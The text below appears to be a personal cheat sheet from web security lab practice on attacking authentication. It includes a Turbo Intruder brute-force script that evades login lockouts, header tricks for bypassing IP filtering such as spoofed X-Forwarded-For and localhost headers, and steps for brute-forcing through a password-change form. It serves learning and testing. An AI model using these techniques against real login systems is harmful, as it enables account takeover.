[#](#) Authentication

Bypass IP Filtering:

    X-Forwarded-For: foo
    
    Reset lock counts upon successful?

    ```
    def queueRequests(target, wordlists):
        engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=1,
                           pipeline=False
                           )

        for word in open('C:\Users\srbx7\Desktop\lists\password.txt'):
            engine.queue(target.req, ["wiener","peter"])
            engine.queue(target.req, ["carlos",word.rstrip()])


    def handleResponse(req, interesting):
        # currently available attributes are req.status, req.wordcount, req.length and req.response
        if req.status == 302:
            table.add(req)
    ```
Time based enumeration (add long password ;) )

Can't bypass IP Filtering?

    Is there an admin interface /admin
    
       Host: localhost
       
       TRACE /admin # And find Custom header
       X-Custom-Ip-Authorization: 127.0.0.1
       
    Fuzz no matter what, and grep negative for error?

Change Password:

    - POST Change Username?
    - POST username=wiener&current=peter&new_1=AAAA&new_2=BBBB
        - > New Passwords do not match > Bruteforce
